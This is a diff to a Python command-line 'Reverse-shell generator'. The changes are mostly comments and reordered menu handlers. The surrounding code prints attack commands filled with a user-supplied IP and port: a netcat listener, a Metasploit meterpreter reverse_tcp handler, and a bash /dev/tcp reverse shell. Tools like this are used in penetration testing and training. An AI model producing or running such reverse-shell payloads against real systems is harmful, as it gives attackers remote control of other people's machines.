@@ -5,6 +5,7 @@ import socket
 from colorama import Fore , Back , Style 
 from turtle import heading
 from pyfiglet import Figlet
+
 heading = Figlet(font='big')
 print(heading.renderText("Reverse-shell\ngenerator"))
 
@@ -14,12 +15,14 @@ hostname = socket.gethostname()
 ipaddress = socket.gethostbyname(hostname)
 print("\n\nYour ip address is :"+ipaddress)
 
-
+#taking ip and port number from the user
 ip = input(Fore.YELLOW + "\nEnter the ip address\n")
 port = input("Enter the listning port number\n")
 
+
+#difining a function to display the usage guidelines
 def guide():
-    subheading1 = Figlet(font="stop")
+    subheading1 = Figlet(font="doom")
 # doom big eftipiti cybermedium epic larry3d mini ogre puffy 
     print(subheading1.renderText("Listner"))
 
@@ -62,23 +65,18 @@ def guide():
 
 guide()
 
+
+#take the input command until the user quite(exit)
 while True:
     take = input("$")
-    if take == "clear":
-        a = platform.system()
-        if a == "Windows":
-            os.system('cls')
-        elif a == "Linux":
-            os.system('clear')
-    elif take == "ls":
+    if take == "rsg -h":
         guide()
-    elif take == "rsg -h":
-        guide()
-    elif take == "ifconfig":
-        print("IPV4 Address :"+ipaddress)
-    elif take == "ipconfig":
-        print("IPV4 Address   :"+ipaddress)
-            
+        
+        
+        
+        
+#response part for the listner request (12)    
+
     elif take == "rsg listner 1":
         print("\n\nnc -lnvp "+port+"\n\n")
     elif take == "rsg listner 2":
@@ -105,6 +103,10 @@ while True:
         print('\n\nmsfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost '+ip+'; set lport '+port+'; exploit"\n\n')
         
         
+        
+        
+# response part for the reverse-shell request (30)
+
     elif take == "rsg reverse-shell 1":
         print("\n\nsh -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\n\n")
     elif take == "rsg reverse-shell 2":
@@ -317,6 +319,24 @@ except KeyboardInterrupt:\n
         print("lport        :"+port)
         print("lhost        :"+ip)
     
+    elif take == "clear":
+        a = platform.system()
+        if a == "Windows":
+            os.system('cls')
+        elif a == "Linux":
+            os.system('clear')
+            
+            
+    elif take == "ls":
+        guide()
+        
+        
+    elif take == "ifconfig":
+        print("IPV4 Address :"+ipaddress)
+        
+        
+    elif take == "ipconfig":
+        print("IPV4 Address   :"+ipaddress)
         
     elif take == "exit":
         break
